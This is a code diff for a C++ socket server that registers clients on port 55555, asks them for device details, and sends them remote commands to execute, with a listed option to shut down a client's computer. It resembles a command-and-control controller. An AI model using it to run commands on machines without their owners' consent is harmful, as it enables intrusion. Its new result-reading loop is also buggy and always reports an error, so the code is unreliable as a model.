@@ -4,6 +4,7 @@
 //
 
 #include <iostream>
+#include <time.h>
 #include <sys/types.h>   // Types used in sys/socket.h and netinet/in.h
 #include <netinet/in.h>  // Internet domain address structures and functions
 #include <sys/socket.h>  // Structures and functions used for socket API
@@ -20,12 +21,12 @@ static int stopListening = 0;
 static int socketHandle;
 static vector<int> clients;
 
-static void *client(void* sock) {
+// New connected clients are sent to this function
+static void *introduceClient(void* sock) {
     int* data = reinterpret_cast<int*>(sock);
     int Socket = *data;
-	cout << "Client connected!\n";
-    
-    // Send welcome message
+
+    // Request the client for details about itself
     rapidjson::StringBuffer s;
     rapidjson::Writer<rapidjson::StringBuffer> writer(s);
     writer.StartObject();
@@ -34,30 +35,30 @@ static void *client(void* sock) {
     writer.EndObject();
     const char *message = s.GetString();
     send(Socket, message, strlen(message), 0);
-    
-    clients.push_back(Socket); // Store client
-    
-    char buffer[1000] = ""; // Accept messages from client
-    while(1) {
-        ssize_t message = recv(Socket, buffer, sizeof(buffer), 0);
-        if(message == -1) break;
-        if(message == 0) continue;
-        
-        // Got message, parse the JSON
-        rapidjson::Document document;
-        if (document.Parse<0>(buffer).HasParseError()) {
-            continue; // Skip if error parsing
-        }
 
-        if(document["res"].IsString()) {
-            if(strcmp(document["res"].GetString(), "details") == 0) {
-                cout << "Got client info: " << buffer << "\n\n";
-            } else if(strcmp(document["res"].GetString(), "execute") == 0) {
-                cout << "Command finished executing with response: " << document["cmd"].GetString() << "\n\n";
-            }
+    // TODO: Add timeout
+    // TODO: Store client object with device information
+    
+    // Wait for response from client
+    char buffer[1000] = "";
+    ssize_t receivedMsg = recv(Socket, buffer, sizeof(buffer), 0);
+    if(receivedMsg <= 0) return 0; // Ignore errors
+    
+    // Got message, parse the JSON
+    rapidjson::Document document;
+    if (document.Parse<0>(buffer).HasParseError()) {
+        return 0; // Skip if error parsing
+    }
+
+    if(document["res"].IsString()) {
+        if(strcmp(document["res"].GetString(), "details") == 0) {
+            cout << "Got client info: " << buffer << "\n\n";
+            clients.push_back(Socket); // Store client
+            return 0; // All good to go, end it here
         }
     }
     
+    close(Socket); // Close client connection, not giving information
     pthread_exit(0);
 }
 
@@ -75,7 +76,7 @@ static void *listen(void* arg) {
 	serverInf.sin_port = htons(55555);
     
 	if(bind(socketHandle, (sockaddr*)&serverInf, sizeof(serverInf)) < 0) {
-        cout << "Could not bind to socket.\n";
+        cout << "Could not bind to socket. Try waiting a few moments.\n";
         close(socketHandle);
         return 0;
     }
@@ -89,12 +90,54 @@ static void *listen(void* arg) {
         clientThread = NULL;
         TempSock = accept(socketHandle, NULL, NULL);
         if(TempSock < 0) continue; // If accept() returns error, skip it
-        pthread_create(&clientThread, NULL, client, new int(TempSock));
+        pthread_create(&clientThread, NULL, introduceClient, new int(TempSock));
         TempSock = NULL;
 	}
     
     cout << "Closing listen thread...\n";
     pthread_exit(0);
+}
+
+static void executeClientCommand(const char *cmd, int* socketInput) {
+    int* data = reinterpret_cast<int*>(socketInput);
+    int Socket = *data;
+    
+    rapidjson::StringBuffer s;
+    rapidjson::Writer<rapidjson::StringBuffer> writer(s);
+    writer.StartObject();
+    writer.String("req");
+    writer.String("execute");
+    writer.String("cmd");
+    writer.String(cmd);
+    writer.EndObject();
+    const char *message = s.GetString();
+    send(Socket, message, strlen(message), 0);
+    ssize_t receivedMsg;
+    
+    // Receive data
+    char buffer[1024*1024] = "";
+    while(1) {
+        receivedMsg = recv(Socket, buffer, sizeof(buffer), 0);
+        if(receivedMsg <= 0) break;
+    }
+    
+    if(receivedMsg <= 0) {
+        cout << "Received an error when reading from client. Not sure if the command was executed successfully.\n";
+        return; // Ignore errors
+    }
+    
+    // Got message, parse the JSON
+    rapidjson::Document document;
+    if (document.Parse<0>(buffer).HasParseError()) {
+        cout << "Error parsing reply from client. Not sure if the command was executed successfully.\n";
+        return; // Skip if error parsing
+    }
+    
+    if(document["res"].IsString()) {
+        if(strcmp(document["res"].GetString(), "execute") == 0) {
+            cout << "Got command result: " << document["cmd"].GetString() << endl;
+        }
+    }
 }
 
 // Allows us to read arguments from server commands
@@ -158,6 +201,7 @@ int main()
             cout << "   listen          Begin listening for connections\n";
             cout << "   list clients    Lists all connected clients\n";
             cout << "   shutdown        Args: [id]. Immediately shuts down the computer of a given client\n";
+            cout << "   update          Args: [id]. Request a client to send its device details and save that info.\n";
             cout << "   exit            Stop the server, and close any open sockets\n";
         } else if(input == "listen") {
             pthread_create(&listenThread, NULL, listen, NULL);
@@ -175,24 +219,7 @@ int main()
             
             const char *argument = args[2].c_str();
             int clientID = atoi(argument);
-            int clientSocket;
-            
-            try {
-                clientSocket = clients.at(clientID);
-            } catch(exception e) {
-                cout << "Error: Could not find a client with the given ID.\n";
-                continue;
-            }
-            
-            rapidjson::StringBuffer s;
-            rapidjson::Writer<rapidjson::StringBuffer> writer(s);
-            writer.StartObject();
-            writer.String("req");
-            writer.String("details");
-            writer.EndObject();
-            const char *message = s.GetString();
-            send(clients[clientID], message, strlen(message), 0);
-            sleep(0.5);
+            // (To Do)
         } else if(input.compare(0, std::string("execute").length(), std::string("execute")) == 0) {
             if(args.size() != 3) {
                 cout << "Usage: execute [clientID] [command]. Get clientID from 'list clients'.\n";
@@ -211,17 +238,7 @@ int main()
             }
             
             cout << "Sending execute request to Client #" << clientID << "...\n";
-            rapidjson::StringBuffer s;
-            rapidjson::Writer<rapidjson::StringBuffer> writer(s);
-            writer.StartObject();
-            writer.String("req");
-            writer.String("execute");
-            writer.String("cmd");
-            writer.String(args[2].c_str());
-            writer.EndObject();
-            const char *message = s.GetString();
-            send(clients[clientID], message, strlen(message), 0);
-            sleep(0.5);
+            executeClientCommand(args[2].c_str(), new int(clients[clientID]));
         } else if(input.compare(0, std::string("shutdown").length(), std::string("shutdown")) == 0) {
             
         } else if(input == "exit") {
